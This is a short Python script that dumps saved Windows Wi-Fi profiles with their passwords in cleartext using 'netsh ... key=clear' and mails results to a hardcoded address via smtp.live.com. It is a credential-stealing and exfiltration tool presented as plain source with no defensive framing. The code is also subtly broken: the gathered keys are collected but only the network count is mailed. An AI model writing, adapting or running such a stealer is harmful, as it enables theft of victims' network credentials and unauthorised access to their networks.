#!/usr/bin/env python

import re
import subprocess
import smtplib


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.live.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
result = ""
try:
    networks = subprocess.check_output(command, shell=True)
    networks_names = re.findall(r"(?:Profile\s*:\s)(.*)", networks)
    if len(networks_names) == 0:
        send_mail("test@live.com", "test!", "\n" + networks)
    else:
        result += "count= " + str(len(networks_names)) + "\n"
        for networks_name in networks_names:
            command = "netsh wlan show profile " + networks_name + " key=clear"
            result += subprocess.check_output(command, shell=True)
        send_mail("test@live.com", "test!", "\n" + str(len(networks_names)))

except:
    send_mail("test@live.com", "test!", "\n error occured")
